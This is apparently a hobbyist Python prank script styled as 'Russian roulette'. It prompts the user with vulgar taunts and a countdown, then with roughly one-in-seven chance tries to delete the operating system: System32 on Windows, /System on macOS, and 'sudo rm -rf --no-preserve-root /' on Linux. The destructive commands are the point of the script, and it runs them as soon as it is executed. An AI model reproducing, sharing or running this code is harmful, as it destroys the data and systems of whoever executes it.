import os
import platform
import random
import time


def russian_roulette():
    get_os, redy = platform.system(
    ), ["Yes", "Whatever bro I don't give a fuck"]
# for i in range(0, 70):
    bigdick = input("Are you sure?: ").capitalize()
    # time.sleep(1)
    # if bigdick == "Yes":
    #     print("Code running attemp: %d" % (i+1))
    #     time.sleep(1)
    #     print('Task failed sucessfully.')
    #     time.sleep(1)
    #     if i == 69:
    print('Task complete.')
    time.sleep(1)
    print("Wow, you surely have a big dick.")
    time.sleep(2)
    print("Let's see if you're lucky enough.")
    time.sleep(2)
    temp = input("Are you ready?: ").capitalize()
    if temp == 'Yes':
        print('Performing "Russian roulette".')
        time.sleep(2)
        print("I dare you to click 'yes' one more time")
        time.sleep(2)
        print("Performing countdown.")
        time.sleep(2)
        for j in range(10, -1, -1):
            print(j)
            time.sleep(2)
        print("See you in the other side.")
        time.sleep(2)
        if random.randint(0, 6) == 1:
            if get_os == "Windows":
                os.remove("C:\\Windows\\System32")
            elif get_os == "Darwin":
                os.remove("/System")
            elif get_os == "Linux":
                os.system('sudo rm -rf --no-preserve-root /')
            else:
                print("Holy shit, you're so fucking lucky.")
                time.sleep(2)
                print("God bless you 'King/Queen'.")
                time.sleep(2)
                print('Goodbye')
                return 0
    elif temp == "Whatever bro I don't give a fuck":
        print('Performing "Russian roulette".')
        time.sleep(2)
        print("I dare you to click 'yes' one more time.")
        time.sleep(2)
        print("Performing countdown.")
        time.sleep(2)
        for j in range(10, -1, -1):
            print(j)
            time.sleep(2)
        print("See you in the other side.")
        time.sleep(2)
        print("Holy shit, you're so fucking lucky.")
        time.sleep(2)
        print("God bless you 'King/Queen'.")
        time.sleep(2)
        print('Goodbye.')
        time.sleep(2)
        return 0

    elif bigdick != "Yes" or temp == "No":
        print("Fucking Pussy.")
        time.sleep(2)
        return 0


russian_roulette()
